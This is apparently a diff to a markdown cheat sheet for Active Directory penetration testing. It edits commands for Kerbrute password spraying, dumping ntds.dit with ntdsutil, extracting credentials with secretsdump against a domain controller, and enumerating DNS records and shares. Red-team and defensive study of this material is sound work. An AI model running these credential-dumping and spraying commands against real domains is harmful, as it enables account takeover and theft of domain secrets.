@@ -138,8 +138,6 @@
       * `Get-ADDefaultDomainPasswordPolicy`
    * CrackMapExec
       * `crackmapexec smb <ip> -d <domain> -u <user> -p <pass> --pass-pol`
-   * Impacket
-      * `GetADUsers.py <domain>/<user>:<pass> -dc-ip <ip>`
 * Kerbrute
    * `kerbrute passwordspray -d <domain> users.txt <password>`
    * Don't forget to try: `--user-as-pass`
@@ -389,8 +387,8 @@
    * `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"`
    * `Compress-Archive -Path C:\Temp\* -DestinationPath C:\Temp\dump.zip`
 * SecretsDump
-   * `secretsdump.py <domain>/<user>:<pass>@<target> -outputfile dump`
-   * `secretsdump.exe <domain>/<user>:<pass>@<target> -outputfile dump`
+   * `secretsdump.py <domain>/<user>:<pass>@<target> -just-dc -outputfile dump`
+   * `secretsdump.exe <domain>/<user>:<pass>@<target> -just-dc -outputfile dump`
 
 
 ## SecretsDump (local)
@@ -899,4 +897,4 @@ The KrbRelayUp tool uses this service ticket to authenticate to the local Servic
 * SharpAdidnsdump
    * `SharpAdidnsdump.exe <dc_ip>`
 * SharpShares
-   * `SharpShares.exe shares`
+   * `SharpShares.exe /ldap:all`
